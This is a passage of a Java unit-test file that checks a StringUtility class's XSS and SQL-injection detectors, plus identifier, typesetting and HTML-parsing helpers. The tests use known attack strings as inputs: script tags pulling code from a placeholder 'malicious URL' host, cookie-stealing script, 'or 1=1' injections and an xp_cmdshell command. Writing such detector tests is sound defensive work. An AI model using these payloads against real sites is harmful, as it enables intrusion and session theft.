		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<IMG STYLE='xss:expre\\ssion(alert(\"XSS\"))'>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<STYLE TYPE=\"text/css\">.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<BASE HREF=\"javascript:alert('XSS');//\">"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("getURL(\"javascript:alert('XSS')\")"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("a=\"get\";b=\"URL\";c=\"javascript:\";d=\"alert('XSS');\";eval(a+b+c+d);"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<XML SRC=\"javascript:alert('XSS');\">"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("\"> <BODY ONLOAD=\"a();\"><SCRIPT>function a(){alert('XSS');}</SCRIPT><\""));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<SCRIPT SRC=\"http://惡意網址/xss.jpg\"></SCRIPT>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<IMG SRC=\"javascript:alert('XSS')\""));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<!--#exec cmd=\"/bin/echo '<SCRIPT SRC'\"--><!--#exec cmd=\"/bin/echo '=http://惡意網址/a.js></SCRIPT>'\"-->"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<SCRIPT a=\">\" SRC=\"http://惡意網址/a.js\"></SCRIPT>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<SCRIPT =\">\" SRC=\"http://惡意網址/a.js\"></SCRIPT>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<SCRIPT a=\">\" '' SRC=\"http://惡意網址/a.js\"></SCRIPT>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<SCRIPT \"a='>'\" SRC=\"http://惡意網址/a.js\"></SCRIPT>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://惡意網址/a.js\"></SCRIPT>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("admin'--"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("' or 0=0 --"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("\" or 0=0 --"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("or 0=0 --"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("' or 0=0 #"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("\" or 0=0 #"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("or 0=0 #"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("' or 'x'='x"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("\" or \"x\"=\"x"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("') or ('x'='x"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("' or 1=1--"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("\" or 1=1--"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("or 1=1--"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("' or a=a--"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("\" or \"a\"=\"a"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("') or ('a'='a"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("\") or (\"a\"=\"a"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("hi\" or \"a\"=\"a"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("hi\" or 1=1 --"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("hi' or 1=1 --"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("hi' or 'a'='a"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("hi') or ('a'='a"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("hi\") or (\"a\"=\"aXSS測試語法><script>alert(document.cookie)</script>"));
	}
	
	private void testOrEqualsString(String xssString) {
		assertEquals(false, StringUtility.cleanXSSPattern(xssString).equals(xssString));
	}
	
	@Test
	public void testCleanOrEqualsPattern() {
		testOrEqualsString("' or 0=0 --");
		testOrEqualsString("\" or 0=0 --");
		testOrEqualsString("or 0=0 --");
		testOrEqualsString("' or 0=0 #");
		testOrEqualsString("\" or 0=0 #");
		testOrEqualsString("or 0=0 #");
		testOrEqualsString("' or 'x'='x");
		testOrEqualsString("\" or \"x\"=\"x");
		testOrEqualsString("') or ('x'='x");
		testOrEqualsString("' or 1=1--");
		testOrEqualsString("\" or 1=1--");
		testOrEqualsString("or 1=1--");
		testOrEqualsString("' or a=a--");
		testOrEqualsString("\" or \"a\"=\"a");
		testOrEqualsString("') or ('a'='a");
		testOrEqualsString("\") or (\"a\"=\"a");
		testOrEqualsString("hi\" or \"a\"=\"a");
		testOrEqualsString("hi\" or 1=1 --");
		testOrEqualsString("hi' or 1=1 --");
		testOrEqualsString("hi' or 'a'='a");
		testOrEqualsString("hi') or ('a'='a");
		testOrEqualsString("hi\") or (\"a\"=\"aXSS測試語法><script>alert(document.cookie)</script>");
	}
	
	@Test
	public void testIsOrEqualsPattern() {
		assertEquals(true, StringUtility.isOrEqualsPattern("' or 0=0 --"));
		assertEquals(true, StringUtility.isOrEqualsPattern("\" or 0=0 --"));
		assertEquals(true, StringUtility.isOrEqualsPattern("or 0=0 --"));
		assertEquals(true, StringUtility.isOrEqualsPattern("' or 0=0 #"));
		assertEquals(true, StringUtility.isOrEqualsPattern("\" or 0=0 #"));
		assertEquals(true, StringUtility.isOrEqualsPattern("or 0=0 #"));
		assertEquals(true, StringUtility.isOrEqualsPattern("' or 'x'='x"));
		assertEquals(true, StringUtility.isOrEqualsPattern("\" or \"x\"=\"x"));
		assertEquals(true, StringUtility.isOrEqualsPattern("') or ('x'='x"));
		assertEquals(true, StringUtility.isOrEqualsPattern("' or 1=1--"));
		assertEquals(true, StringUtility.isOrEqualsPattern("\" or 1=1--"));
		assertEquals(true, StringUtility.isOrEqualsPattern("or 1=1--"));
		assertEquals(true, StringUtility.isOrEqualsPattern("' or a=a--"));
		assertEquals(true, StringUtility.isOrEqualsPattern("\" or \"a\"=\"a"));
		assertEquals(true, StringUtility.isOrEqualsPattern("') or ('a'='a"));
		assertEquals(true, StringUtility.isOrEqualsPattern("\") or (\"a\"=\"a"));
		assertEquals(true, StringUtility.isOrEqualsPattern("hi\" or \"a\"=\"a"));
		assertEquals(true, StringUtility.isOrEqualsPattern("hi\" or 1=1 --"));
		assertEquals(true, StringUtility.isOrEqualsPattern("hi' or 1=1 --"));
		assertEquals(true, StringUtility.isOrEqualsPattern("hi' or 'a'='a"));
		assertEquals(true, StringUtility.isOrEqualsPattern("hi') or ('a'='a"));
		assertEquals(true, StringUtility.isOrEqualsPattern("hi\") or (\"a\"=\"aXSS測試語法><script>alert(document.cookie)</script>"));
	}
	
	@Test
	public void testIsBalanceTag() {
		assertEquals(false, StringUtility.isBalanceTag("';exec%20master..xp_cmdshell%20'dir%20 c:%20>%20c:\\inetpub\\wwwroot\\?.txt'--&&", "<", ">"));
	}
	
	@Test
	public void testGetTypesettingString() {
		String taiwan = "我媽叫我大隻的(因為我弟叫小隻的)；大學同學、中央團契、高榮禮拜堂和實驗室叫我阿毛或毛哥；石牌信友堂叫我正岐或正岐哥；我的太太慧惠叫我岐岐；上帝叫我親愛的孩子。";
		String english = "successfully in a software organization is possibly the most";

		System.out.println(StringUtility.getTypesettingString(taiwan, "\n", 10, "simple"));
		System.out.println(StringUtility.getTypesettingString(taiwan, "\n", 10));
		System.out.println(StringUtility.getTypesettingString(english, "\n", 20));
	}
	

	@Test
	public void testIsIdentifierPart() {
		assertEquals(true, StringUtility.isIdentifierPart("abcdefg"));
		assertEquals(true, StringUtility.isIdentifierPart("abcd_efg"));
		assertEquals(true, StringUtility.isIdentifierPart("abcdefg123"));
		assertEquals(true, StringUtility.isIdentifierPart("abcd_efg_123"));
		assertEquals(true, StringUtility.isIdentifierPart("123abcdefg"));
		assertEquals(true, StringUtility.isIdentifierPart("123abcdefg"));
		assertEquals(false, StringUtility.isIdentifierPart("abc`[];',./defg"));
	}
	
	@Test
	public void testIsIdentifierStart() {
		assertEquals(true, StringUtility.isIdentifierStart("abcdefg"));
		assertEquals(true, StringUtility.isIdentifierStart("abcd_efg"));
		assertEquals(true, StringUtility.isIdentifierStart("abcdefg123"));
		assertEquals(true, StringUtility.isIdentifierStart("abcd_efg_123"));
		assertEquals(false, StringUtility.isIdentifierStart("123abcdefg"));
		assertEquals(false, StringUtility.isIdentifierStart("123abcdefg"));
		assertEquals(true, StringUtility.isIdentifierStart("abc`[];',./defg"));
	}
	
	@Test
	public void testIsIdentifier() {
		assertEquals(true, StringUtility.isIdentifier("abcdefg"));
		assertEquals(true, StringUtility.isIdentifier("abcd_efg"));
		assertEquals(true, StringUtility.isIdentifier("abcdefg123"));
		assertEquals(true, StringUtility.isIdentifier("abcd_efg_123"));
		assertEquals(false, StringUtility.isIdentifier("123abcdefg"));
		assertEquals(false, StringUtility.isIdentifier("123abcdefg"));
		assertEquals(false, StringUtility.isIdentifier("abc`[];',./defg"));
	}
	
	@Test
	public void testGetElementsByTagName() {
		String content = "<html>" + 
		"	<head>" + 
		"		<!-- css tab -->" + 
		"<style type=\"text/css\">" + 
		"<!--" + 
		"/*- Menu Tabs 1--------------------------- */" + 
		"" + 
		"" + 
		"    #menu {" + 
		"      	float:left;" + 
		"      	width:100%;" + 
		"      	background:#F4F7FB;" + 
		"      	font-size:93%;" + 
		"      	line-height:normal;" + 
		"/*      border-bottom:1px solid #BCD2E6;*/" + 
		"		border-bottom:1px solid #CCCCCC;" + 
		"		margin: 0 0 5px 0;" + 
		"    }" + 
		"    #menu ul {" + 
		"    	margin:0;" + 
		"        padding:0 0 0 0;" + 
		"        list-style:none;" + 
		"    }" + 
		"    #menu li {" + 
		"      	display:inline;" + 
		"      	margin:0;" + 
		"      	padding:0;" + 
		"    }" + 
		"    #menu a {" + 
		"     	float:left;" + 
		"      	background:url(\"images/tableft1.gif\") no-repeat left top;" + 
		"      	margin:0;" + 
		"      	padding:0 0 0 4px;" + 
		"      	text-decoration:none;" + 
		"    }" + 
		"    #menu a div {" + 
		"    	float:left;" + 
		"      	display:block;" + 
		"      	background:url(\"images/tabright1.gif\") no-repeat right top;" + 
		"      	padding:5px 15px 4px 6px;" + 
		"      	color:#627EB7;" + 
		"    }" + 
		"    /* Commented Backslash Hack hides rule from IE5-Mac \\*/" + 
		"    #menu a div {float:none;}" + 
		"    /* End IE5-Mac hack */" + 
		"    #menu a:hover div {" + 
		"    	color:#627EB7;" + 
		"    }" + 
		"    #menu a:hover {" + 
		"    	background-position:0% -42px;" + 
		"    }" + 
		"    #menu a:hover div {" + 
		"    	background-position:100% -42px;" + 
		"    }" + 
		"" + 
		"    #menu #current a {" + 
		"        background-position:0% -42px;" + 
		"    }" + 
		"    #menu #current a div {" + 
		"        background-position:100% -42px;" + 
		"    }" + 
		"-->" + 
		"</style>" + 
		"" + 
		"		" + 
		"		<link href = \"/csiebug-taglib-demo//css/csiebug.css\" rel = \"stylesheet\" type = \"text/css\">" + 
		"<link href = \"/csiebug-taglib-demo//css/jquery-ui-1.7.2.custom.css\" rel = \"stylesheet\" type = \"text/css\">" + 
		"		" + 
		"		<link rel=\"shortcut icon\" href=\"/csiebug-taglib-demo//images/favicon.ico\" />" + 
		"		<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"/>" + 
		"		<title>TaglibDemoList</title>" + 
		"	</head>" + 
		"	<body>" + 
		"		<form id=\"taglibDocList\" name=\"taglibDocList\" action=\"/csiebug-taglib-demo/taglibDocList\" method=\"POST\">" + 
		"			<!-- ???? -->" + 
		"" + 
		"			<table width=\"100%\">" + 
		"				<tr>" + 
		"					<td class=\"PageHeader\">TaglibDemoList</td>" + 
		"				</tr>" + 
		"			</table>" + 
		"			<div id=\"alertDialog\" title=\"var.title\" style=\"position:relative;left:0;top:0; z-index:999;display:none;\">" + 
		"	<table align=center border=0 cellspacing=2 cellpadding=0>" + 
		"		<tr>" + 
		"" + 
		"			<td align=\"center\" nowrap>var.message</td>" + 
		"		</tr>" + 
		"		<tr>" + 
		"			<td align=center>" + 
		"				<table>" + 
		"					<tr>" + 
		"						<td>" + 
		"							<button type=\"button\" id=\"alertDialogButton\" name=\"alertDialogButton\" onClick=\"closeAlertDialog('var.objId', 'var.focusId', 'var.func');\" >var.button</button>" + 
		"" + 
		"						</td>" + 
		"					</tr>" + 
		"				</table>" + 
		"			</td>" + 
		"		</tr>" + 
		"	</table>" + 
		"</div>" + 
		"" + 
		"<div id=\"confirmDialog\" title=\"var.title\" style=\"position:relative;left:0;top:0; z-index:999;display:none;\">" + 
		"	<table align=center border=0 cellspacing=2 cellpadding=0>" + 
		"" + 
		"		<tr>" + 
		"			<td align=\"center\" nowrap>var.message</td>" + 
		"		</tr>" + 
		"		<tr>" + 
		"			<td align=center>" + 
		"				<table>" + 
		"					<tr>" + 
		"						<td>" + 
		"" + 
		"							<button type=\"button\" id=\"confirmDialogOK\" name=\"confirmDialogOK\" onClick=\"loading(this);closeConfirmDialog('var.objId', 'var.focusId', true, 'var.func');\" >var.ok</button>" + 
		"							<button type=\"button\" id=\"confirmDialogCancel\" name=\"confirmDialogCancel\" onClick=\"closeConfirmDialog('var.objId', 'var.focusId', false, 'var.func');\" >var.cancel</button>" + 
		"						</td>" + 
		"					</tr>" + 
		"				</table>" + 
		"			</td>" + 
		"		</tr>" + 
		"	</table>" + 
		"" + 
		"</div>" + 
		"" + 
		"<img id=\"waitButton\" src=\"images/gif_wait.gif\" style=\"position:relative;left:0;top:0; z-index:5;display:none;\">" + 
		"			" + 
		"			<!-- ???????? -->" + 
		"			" + 
		"			<button type=\"button\" onClick=\"test();\">test</button>" + 
		"			" + 
		"			<link rel = \"STYLESHEET\" href = \"/csiebug-taglib-demo//css/treeview.css\" type = \"text/css\">" + 
		"<script language = \"javascript\" src = \"/csiebug-taglib-demo//js/treeview.js\"></script>" + 
		"" + 
		"<div style = \"font-size:9pt;padding:0;margin:0;border:none;text-align:left;line-height:0;top:0;bottom:0\">" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"<img id = \"form_line\" name = \"form_line\" src = \"/csiebug-taglib-demo//images/ETplus.gif\" style = \"CURSOR:pointer\" onClick = \"showSubTree('form', '/csiebug-taglib-demo//images')\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img id = \"form_folder\" name = \"form_folder\" src = \"/csiebug-taglib-demo//images/Cfolder.gif\" title = \"Form\" style = \"CURSOR:pointer\" onClick = \"showSubTree('form', '/csiebug-taglib-demo//images')\" align = \"absmiddle\">" + 
		"<span title = \"Form\" style = \"CURSOR:pointer\" onClick = \"showSubTree('form', '/csiebug-taglib-demo//images')\">Form</span>" + 
		"" + 
		"<div id = \"form\" name = \"form\" style = \"display:none;line-height:0\">" + 
		"<img src = \"/csiebug-taglib-demo//images/Vertline.gif\" align = \"absmiddle\"></img>" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"<img src = \"/csiebug-taglib-demo//images/E.gif\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Leaf.gif\" title = \"Text\" style = \"CURSOR:pointer\" align = \"absmiddle\" onClick = \"parent.mainFrame.location.href='/csiebug-taglib-demo//textDoc'\">" + 
		"<a href = \"/csiebug-taglib-demo//textDoc\" target = \"mainFrame\">Text</a>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Vertline.gif\" align = \"absmiddle\"></img>" + 
		"" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"<img src = \"/csiebug-taglib-demo//images/E.gif\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Leaf.gif\" title = \"Text Area\" style = \"CURSOR:pointer\" align = \"absmiddle\" onClick = \"parent.mainFrame.location.href='/csiebug-taglib-demo//textAreaDoc'\">" + 
		"<a href = \"/csiebug-taglib-demo//textAreaDoc\" target = \"mainFrame\">Text&nbsp;Area</a>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Vertline.gif\" align = \"absmiddle\"></img>" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"<img src = \"/csiebug-taglib-demo//images/E.gif\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Leaf.gif\" title = \"Text Interval\" style = \"CURSOR:pointer\" align = \"absmiddle\" onClick = \"parent.mainFrame.location.href='/csiebug-taglib-demo//textIntervalDoc'\">" + 
		"<a href = \"/csiebug-taglib-demo//textIntervalDoc\" target = \"mainFrame\">Text&nbsp;Interval</a>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Vertline.gif\" align = \"absmiddle\"></img>" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"<img src = \"/csiebug-taglib-demo//images/E.gif\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Leaf.gif\" title = \"Select\" style = \"CURSOR:pointer\" align = \"absmiddle\" onClick = \"parent.mainFrame.location.href='/csiebug-taglib-demo//selectDoc'\">" + 
		"<a href = \"/csiebug-taglib-demo//selectDoc\" target = \"mainFrame\">Select</a>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Vertline.gif\" align = \"absmiddle\"></img>" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/E.gif\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Leaf.gif\" title = \"Multi Select\" style = \"CURSOR:pointer\" align = \"absmiddle\" onClick = \"parent.mainFrame.location.href='/csiebug-taglib-demo//multiSelectDoc'\">" + 
		"<a href = \"/csiebug-taglib-demo//multiSelectDoc\" target = \"mainFrame\">Multi&nbsp;Select</a>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Vertline.gif\" align = \"absmiddle\"></img>" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"<img src = \"/csiebug-taglib-demo//images/E.gif\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Leaf.gif\" title = \"Editable Select\" style = \"CURSOR:pointer\" align = \"absmiddle\" onClick = \"parent.mainFrame.location.href='/csiebug-taglib-demo//editableSelectDoc'\">" + 
		"<a href = \"/csiebug-taglib-demo//editableSelectDoc\" target = \"mainFrame\">Editable&nbsp;Select</a>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Vertline.gif\" align = \"absmiddle\"></img>" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"<img src = \"/csiebug-taglib-demo//images/E.gif\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Leaf.gif\" title = \"Radio\" style = \"CURSOR:pointer\" align = \"absmiddle\" onClick = \"parent.mainFrame.location.href='/csiebug-taglib-demo//radioDoc'\">" + 
		"<a href = \"/csiebug-taglib-demo//radioDoc\" target = \"mainFrame\">Radio</a>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Vertline.gif\" align = \"absmiddle\"></img>" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/E.gif\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Leaf.gif\" title = \"Radio Group\" style = \"CURSOR:pointer\" align = \"absmiddle\" onClick = \"parent.mainFrame.location.href='/csiebug-taglib-demo//radioGroupDoc'\">" + 
		"<a href = \"/csiebug-taglib-demo//radioGroupDoc\" target = \"mainFrame\">Radio&nbsp;Group</a>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Vertline.gif\" align = \"absmiddle\"></img>" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"<img src = \"/csiebug-taglib-demo//images/L.gif\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Leaf.gif\" title = \"Checkbox\" style = \"CURSOR:pointer\" align = \"absmiddle\" onClick = \"parent.mainFrame.location.href='/csiebug-taglib-demo//checkboxDoc'\">" + 
		"<a href = \"/csiebug-taglib-demo//checkboxDoc\" target = \"mainFrame\">Checkbox</a>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"</div>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"<img id = \"grid_line\" name = \"grid_line\" src = \"/csiebug-taglib-demo//images/Eplus.gif\" style = \"CURSOR:pointer\" onClick = \"showSubTree('grid', '/csiebug-taglib-demo//images')\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img id = \"grid_folder\" name = \"grid_folder\" src = \"/csiebug-taglib-demo//images/Cfolder.gif\" title = \"Grid\" style = \"CURSOR:pointer\" onClick = \"showSubTree('grid', '/csiebug-taglib-demo//images')\" align = \"absmiddle\">" + 
		"<span title = \"Grid\" style = \"CURSOR:pointer\" onClick = \"showSubTree('grid', '/csiebug-taglib-demo//images')\">Grid</span>" + 
		"" + 
		"<div id = \"grid\" name = \"grid\" style = \"display:none;line-height:0\">" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Vertline.gif\" align = \"absmiddle\"></img>" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"<img src = \"/csiebug-taglib-demo//images/E.gif\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Leaf.gif\" title = \"Table\" style = \"CURSOR:pointer\" align = \"absmiddle\" onClick = \"parent.mainFrame.location.href='/csiebug-taglib-demo//tableDoc'\">" + 
		"<a href = \"/csiebug-taglib-demo//tableDoc\" target = \"mainFrame\">Table</a>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Vertline.gif\" align = \"absmiddle\"></img>" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"<img src = \"/csiebug-taglib-demo//images/E.gif\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Leaf.gif\" title = \"Row\" style = \"CURSOR:pointer\" align = \"absmiddle\" onClick = \"parent.mainFrame.location.href='/csiebug-taglib-demo//rowDoc'\">" + 
		"<a href = \"/csiebug-taglib-demo//rowDoc\" target = \"mainFrame\">Row</a>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Vertline.gif\" align = \"absmiddle\"></img>" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"<img src = \"/csiebug-taglib-demo//images/E.gif\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Leaf.gif\" title = \"Column\" style = \"CURSOR:pointer\" align = \"absmiddle\" onClick = \"parent.mainFrame.location.href='/csiebug-taglib-demo//columnDoc'\">" + 
		"<a href = \"/csiebug-taglib-demo//columnDoc\" target = \"mainFrame\">Column</a>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Vertline.gif\" align = \"absmiddle\"></img>" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/L.gif\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Leaf.gif\" title = \"Columns\" style = \"CURSOR:pointer\" align = \"absmiddle\" onClick = \"parent.mainFrame.location.href='/csiebug-taglib-demo//columnsDoc'\">" + 
		"<a href = \"/csiebug-taglib-demo//columnsDoc\" target = \"mainFrame\">Columns</a>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"</div>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"<img id = \"treeViewFolder_line\" name = \"treeViewFolder_line\" src = \"/csiebug-taglib-demo//images/Eplus.gif\" style = \"CURSOR:pointer\" onClick = \"showSubTree('treeViewFolder', '/csiebug-taglib-demo//images')\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img id = \"treeViewFolder_folder\" name = \"treeViewFolder_folder\" src = \"/csiebug-taglib-demo//images/Cfolder.gif\" title = \"Tree View\" style = \"CURSOR:pointer\" onClick = \"showSubTree('treeViewFolder', '/csiebug-taglib-demo//images')\" align = \"absmiddle\">" + 
		"<span title = \"Tree View\" style = \"CURSOR:pointer\" onClick = \"showSubTree('treeViewFolder', '/csiebug-taglib-demo//images')\">Tree&nbsp;View</span>" + 
		"" + 
		"<div id = \"treeViewFolder\" name = \"treeViewFolder\" style = \"display:none;line-height:0\">" + 
		"<img src = \"/csiebug-taglib-demo//images/Vertline.gif\" align = \"absmiddle\"></img>" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"<img src = \"/csiebug-taglib-demo//images/E.gif\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Leaf.gif\" title = \"Tree View\" style = \"CURSOR:pointer\" align = \"absmiddle\" onClick = \"parent.mainFrame.location.href='/csiebug-taglib-demo//treeViewDoc'\">" + 
		"<a href = \"/csiebug-taglib-demo//treeViewDoc\" target = \"mainFrame\">Tree&nbsp;View</a>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Vertline.gif\" align = \"absmiddle\"></img>" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"<img src = \"/csiebug-taglib-demo//images/E.gif\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Leaf.gif\" title = \"Check Tree View\" style = \"CURSOR:pointer\" align = \"absmiddle\" onClick = \"parent.mainFrame.location.href='/csiebug-taglib-demo//checkTreeViewDoc'\">" + 
		"<a href = \"/csiebug-taglib-demo//checkTreeViewDoc\" target = \"mainFrame\">Check&nbsp;Tree&nbsp;View</a>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Vertline.gif\" align = \"absmiddle\"></img>" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"<img src = \"/csiebug-taglib-demo//images/E.gif\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Leaf.gif\" title = \"Menu\" style = \"CURSOR:pointer\" align = \"absmiddle\" onClick = \"parent.mainFrame.location.href='/csiebug-taglib-demo//menuDoc'\">" + 
		"<a href = \"/csiebug-taglib-demo//menuDoc\" target = \"mainFrame\">Menu</a>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Vertline.gif\" align = \"absmiddle\"></img>" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"<img src = \"/csiebug-taglib-demo//images/L.gif\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Leaf.gif\" title = \"Sidebar\" style = \"CURSOR:pointer\" align = \"absmiddle\" onClick = \"parent.mainFrame.location.href='/csiebug-taglib-demo//sidebarDoc'\">" + 
		"<a href = \"/csiebug-taglib-demo//sidebarDoc\" target = \"mainFrame\">Sidebar</a>" + 
		"" + 
		"</span>" + 
		"" + 
		"<br>" + 
		"" + 
		"</div>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"<img id = \"tabFolder_line\" name = \"tabFolder_line\" src = \"/csiebug-taglib-demo//images/Eplus.gif\" style = \"CURSOR:pointer\" onClick = \"showSubTree('tabFolder', '/csiebug-taglib-demo//images')\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img id = \"tabFolder_folder\" name = \"tabFolder_folder\" src = \"/csiebug-taglib-demo//images/Cfolder.gif\" title = \"Tab\" style = \"CURSOR:pointer\" onClick = \"showSubTree('tabFolder', '/csiebug-taglib-demo//images')\" align = \"absmiddle\">" + 
		"<span title = \"Tab\" style = \"CURSOR:pointer\" onClick = \"showSubTree('tabFolder', '/csiebug-taglib-demo//images')\">Tab</span>" + 
		"" + 
